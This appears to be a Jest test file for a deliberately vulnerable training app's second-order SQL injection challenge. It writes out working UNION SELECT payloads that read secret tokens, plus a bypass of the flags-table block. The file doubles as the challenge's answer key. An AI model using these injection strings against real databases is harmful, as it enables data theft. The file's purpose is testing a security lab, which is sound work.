import {
  apiRequest,
  loginOrFail,
  authHeaders,
  TEST_USERS,
  expectFlag,
} from "../helpers/api";
import { FLAGS } from "../helpers/flags";

interface ReviewsResponse {
  reviews: Record<string, unknown>[];
  authors: string[];
  error?: string;
  flag?: string;
  message?: string;
}

/** Closes the author filter and pads the UNION to the panel's six columns. */
const union = (column: string, from: string, comment = " --") =>
  `x' UNION SELECT 1, 2, ${column}, 4, 5, 6 ${from}${comment}`;

const CANARY_PAYLOAD = union(
  "token",
  "FROM internal_secrets WHERE slug='second-order-sql-injection'"
);

describe("Second-Order SQL Injection", () => {
  let userToken: string;
  let adminToken: string;
  let productId: string;

  const storeReview = (author: string) =>
    apiRequest(`/api/products/${productId}/reviews`, {
      method: "POST",
      headers: authHeaders(userToken),
      body: JSON.stringify({ content: "Great product!", author }),
    });

  const audit = (author?: string) =>
    apiRequest<ReviewsResponse>(
      author === undefined
        ? "/api/admin/reviews"
        : `/api/admin/reviews?author=${encodeURIComponent(author)}`,
      { headers: authHeaders(adminToken) }
    );

  beforeAll(async () => {
    userToken = await loginOrFail(
      TEST_USERS.alice.email,
      TEST_USERS.alice.password
    );
    adminToken = await loginOrFail(
      TEST_USERS.admin.email,
      TEST_USERS.admin.password
    );

    const products = await apiRequest<{ id: string }[]>("/api/products");
    productId = products.data[0].id;
  });

  it("returns the flag once a stored author filter exfiltrates the canary", async () => {
    expect((await storeReview(CANARY_PAYLOAD)).status).toBe(201);

    const { status, data } = await audit(CANARY_PAYLOAD);

    expect(status).toBe(200);
    expectFlag(data, FLAGS.SECOND_ORDER_SQL_INJECTION);
    expect(JSON.stringify(data.reviews)).toContain("CANARY-");
  });

  it("refuses the same payload when it never went through the review form", async () => {
    const neverStored = union(
      "token",
      "FROM internal_secrets WHERE slug = 'second-order-sql-injection'"
    );

    const { status, data } = await audit(neverStored);

    expect(status).toBe(200);
    expect(JSON.stringify(data.reviews)).toContain("CANARY-");
    expect(data).not.toHaveProperty("flag");
    expect(data.message).toContain(
      "no review was ever posted under that author"
    );
  });

  it("does not reward a stored payload that extracts nothing", async () => {
    const harmless = "y' UNION SELECT 1, 2, 3, 4, 5, 6 --";
    expect((await storeReview(harmless)).status).toBe(201);

    const { status, data } = await audit(harmless);

    expect(status).toBe(200);
    expect(data).not.toHaveProperty("flag");
    expect(data.message).toContain("SQL syntax detected");
  });

  it("reports the column count mismatch so the UNION can be tuned", async () => {
    const { status, data } = await audit("z' UNION SELECT 1, 2 --");

    expect(status).toBe(200);
    expect(data.error).toContain("same number of result columns");
    expect(data).not.toHaveProperty("flag");
  });

  it("blocks access to the flags table via the author filter", async () => {
    const { status, data } = await audit(
      "test' UNION SELECT flag FROM flags --"
    );

    expect(status).toBe(403);
    expect(data.error).toContain("Access to flags table is not allowed");
  });

  it("never returns a flag value, even when the guard is dodged", async () => {
    const { status, data } = await audit(
      union("group_concat(flag)", "FROM main.flags", "--")
    );

    expect(status).toBe(200);
    expect(JSON.stringify(data.reviews)).not.toContain("OSS{");
    expect(data).not.toHaveProperty("flag");
  });

  it("filters by a normal author without returning a flag", async () => {
    const { status, data } = await audit("alice@example.com");

    expect(status).toBe(200);
    expect(data).not.toHaveProperty("flag");
    expect(data).not.toHaveProperty("message");
  });

  it("refuses a non-admin", async () => {
    const { status } = await apiRequest("/api/admin/reviews", {
      headers: authHeaders(userToken),
    });

    expect(status).toBe(403);
  });
});
